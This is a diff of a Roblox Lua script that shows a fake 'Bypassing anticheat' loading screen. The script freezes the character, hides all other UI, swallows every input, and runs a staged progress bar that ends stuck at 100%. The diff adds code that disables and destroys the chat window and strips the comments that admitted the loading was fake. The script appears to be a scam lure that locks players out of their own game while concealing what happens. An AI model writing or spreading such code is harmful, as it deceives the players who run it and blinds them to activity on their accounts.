@@ -1,11 +1,13 @@
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
 local RunService = game:GetService("RunService")
+local StarterGui = game:GetService("StarterGui")
+local TextChatService = game:GetService("TextChatService")
+local CoreGui = game:GetService("CoreGui")
 
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Disable movement/jumping
 local function disableMovement()
 	local character = player.Character or player.CharacterAdded:Wait()
 	local humanoid = character:FindFirstChildOfClass("Humanoid")
@@ -18,21 +20,36 @@ end
 disableMovement()
 player.CharacterAdded:Connect(disableMovement)
 
--- Hide all existing UI except our screen
 for _, gui in pairs(playerGui:GetChildren()) do
 	if gui:IsA("ScreenGui") and gui.Name ~= "FullCoverLoading" then
 		gui.Enabled = false
 	end
 end
 
--- Also hide any UI that gets added later
 playerGui.ChildAdded:Connect(function(child)
 	if child:IsA("ScreenGui") and child.Name ~= "FullCoverLoading" then
 		child.Enabled = false
 	end
 end)
 
--- Create full screen loading UI
+pcall(function()
+	if TextChatService:FindFirstChild("ChatWindowConfiguration") then
+		TextChatService.ChatWindowConfiguration.Enabled = false
+	end
+end)
+
+pcall(function()
+	if CoreGui:FindFirstChild("Chat") then
+		CoreGui.Chat:Destroy()
+	end
+end)
+
+CoreGui.ChildAdded:Connect(function(child)
+	if child.Name == "Chat" then
+		child:Destroy()
+	end
+end)
+
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "FullCoverLoading"
 screenGui.IgnoreGuiInset = true
@@ -68,12 +85,10 @@ bypassText.Text = "Bypassing anticheat... please wait"
 bypassText.ZIndex = 10001
 bypassText.Parent = background
 
--- Block all input
 UserInputService.InputBegan:Connect(function(input, gameProcessed)
 	return Enum.ContextActionResult.Sink
 end)
 
--- Fake loading progress
 local totalTime = 180
 local steps = 100
 for i = 1, steps do
@@ -81,5 +96,4 @@ for i = 1, steps do
 	loadingText.Text = "Loading.. " .. i .. "%"
 end
 
--- Stuck at 100%
 loadingText.Text = "Loading.. 100%"
